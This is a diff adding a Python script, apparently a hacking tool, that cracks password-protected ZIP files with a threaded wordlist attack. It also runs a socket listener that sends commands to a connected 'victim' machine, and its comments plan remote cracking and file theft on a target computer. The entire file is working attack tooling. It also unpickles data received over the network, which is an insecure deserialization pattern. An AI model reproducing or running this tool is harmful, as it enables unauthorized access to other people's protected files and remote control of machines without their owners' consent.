@@ -1,0 +1,188 @@
+import zipfile
+import argparse
+import os
+import queue
+import socket
+import threading
+import signal
+import pickle
+import subprocess
+
+# Allow the user to chose which zip file to zip
+# If the user wants can choose to brute force all the zip files at the same time
+# Bruteforce the File the user chooses, and once password is found, download it 
+# Check websites for wordlists online 
+# Be able to allow to upload a wordlist to the victim and use that to bruteforce
+
+class Parser:
+	def __init__(self):
+		self.args = argparse.ArgumentParser(description="A program to bruteforce ZIP files while the target computer is running")
+		self.args.add_argument("--zip", help="The zip file you want to bruteforce", type=self.validate_zip_file)
+		self.args.add_argument("--password", help="The password file you want to bruteforce the ZIP file with", type=self.validate_password_file)
+		self.args.add_argument("--ip", help="IP you want to listen on")
+		self.args.add_argument("--port", help="Port you want to listen on", type=self.validate_port_number)
+
+		self.args_parsed = self.args.parse_args()
+
+	def get_dict_args(self):
+		my_list = []
+		get_dict = vars(self.args_parsed)
+		for k, v in get_dict.items():
+			if v:
+				my_list.append(k)
+		return my_list
+
+	def return_password_file(self):
+		return self.args_parsed.password
+
+	def return_zip_file(self):
+		return self.args_parsed.zip
+
+	def return_ip(self):
+		return self.args_parsed.ip
+
+	def return_port_num(self):
+		return self.args_parsed.port
+
+	def validate_zip_file(self, file):
+		if not zipfile.is_zipfile(file):
+			print("[-] Invalid Zip file")
+			exit()
+		return file
+
+	def validate_password_file(self, file):
+		if not os.path.isfile(file):
+			print("[-] Invalid File")
+			exit()
+		return file
+
+	def validate_port_number(self, port):
+		port = int(port)
+		if port > 65535 or port <= 1024:
+			print("[-] Invalid port")
+			exit()
+		return port
+
+class Socket(Parser):
+	def __init__(self):
+		super().__init__()
+		self.port = self.return_port_num()
+		self.ip = self.return_ip()
+
+		self.socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.socket_connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		self.socket_connection.bind((self.ip, self.port))
+		print("\n[+] Waiting for a connection")
+
+		self.socket_connection.listen(0)
+		self.connection, self.address = self.socket_connection.accept()
+
+		self.start_connection()
+
+	def reliable_send_recieve(self, data):
+		data_list = pickle.dumps(data)
+		self.connection.send(data_list)
+		result = self.connection.recv(4096)
+		return result
+
+	def clear(self):
+		return subprocess.call("clear", shell=True)
+
+
+	def command_options(self):
+		return {
+			"clear": self.clear
+		}
+
+	def start_connection(self):
+		print(f"[+] Got connection from -> {self.address[0]}\n")
+		get_command_options = self.command_options()
+
+		while True:
+			user_input = input(">> ")
+			user_input = user_input.split()
+			result = self.reliable_send_recieve(user_input)
+
+			if user_input[0] == "scan-zip":
+				print("[+] Printing Zip files")
+				result = pickle.loads(result)
+				for words in result:
+					print(words)
+
+			elif user_input[0] in get_command_options:
+				get_command_options[user_input[0]]()
+
+			else:
+				print(result.decode())
+
+
+class ZipFile(Parser):
+	def __init__(self):
+		super().__init__()
+		self.zip_file = self.return_zip_file()
+		self.password_word_list = self.return_password_file()
+		self.q = queue.Queue(maxsize=50)
+		self.end_thread = False
+
+	def word_list(self):
+		with open(self.password_word_list, "r") as f:
+			data = f.readlines()
+
+		for password in data:
+			password = password.strip()
+			yield password
+
+	def extract_zip_file(self, zip_file, password):
+		password = password.encode()
+		try:
+			zip_file.extractall(pwd=password)
+			print(f"\n[+] Password -> {password.decode()}")
+			self.end_thread = True
+		except Exception:
+			pass
+
+	def brute_force_zip(self):
+		get_word_list = self.word_list()
+		count = 0
+		get_zip_file = zipfile.ZipFile(self.zip_file)
+
+		print("[+] Starting\n")
+		for password in get_word_list:
+			self.q.put(password)
+			if self.q.qsize() == 50:
+				while not self.q.empty():
+					thread = threading.Thread(target=self.extract_zip_file, args=(get_zip_file, self.q.get()), daemon=True)
+					thread.start()
+					count += 1
+					print(f"\rAttempts: {str(count)}", flush=True, end="")
+
+					if self.q.empty():
+						with self.q.mutex:
+							self.q.queue.clear()
+							continue
+
+					if self.end_thread:
+						print("\n")
+						os.kill(os.getpid(), signal.SIGKILL)
+
+		print("\n[-] Couldnt find password")
+
+class Main():
+	def __init__(self):
+		pass
+
+	def main(self):
+		return {
+			"ip": {"port": Socket},
+			"zip": {"password": ZipFile().brute_force_zip}
+		}
+
+if __name__ == '__main__':
+	get_dict = Parser().get_dict_args()
+	get_main = Main().main()
+
+	if not get_dict:
+		print("[-] Invalid argument.")
+		exit()
+
+	get_main[get_dict[0]][get_dict[1]]()
